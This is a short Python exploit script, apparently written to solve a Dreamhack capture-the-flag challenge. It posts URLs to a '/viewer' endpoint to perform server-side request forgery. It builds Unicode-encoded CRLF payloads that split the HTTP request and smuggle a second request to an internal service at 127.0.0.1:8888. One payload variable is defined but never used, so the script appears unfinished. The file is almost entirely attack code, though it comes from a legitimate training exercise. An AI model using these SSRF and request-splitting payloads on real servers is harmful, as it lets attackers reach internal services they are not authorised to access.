import requests
import socket

#TARGET_URL='http://host1.dreamhack.games:16581'
TARGET_URL='http://localhost'

def get_ipv4_by_hostname(hostname):
    # see `man getent` `/ hosts `
    # see `man getaddrinfo`

    return list(
        i        # raw socket structure
            [4]  # internet protocol info
            [0]  # address
        for i in 
        socket.getaddrinfo(
            hostname,
            0  # port, required
        )
        if i[0] is socket.AddressFamily.AF_INET  # ipv4

        # ignore duplicate addresses with other socket types
        and i[1] is socket.SocketKind.SOCK_RAW  
    )

def ssrf(protocol,host,path,search):
    data={
        "url": "{protocol}://{host}/{path}?{search}".format(protocol=protocol,host=host,path=path,search=search)
    }

    print(data['url'])

    res=requests.post(TARGET_URL+'/viewer',data=data)

    print(res.text)

def main():
    path='\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1:8888\u010D\u010A\u010D\u010AGET\u0120/'
    ssrf('http',get_ipv4_by_hostname('google.com')[0],'\u0120HTTP/1.1\u010D\u010A','')


main()
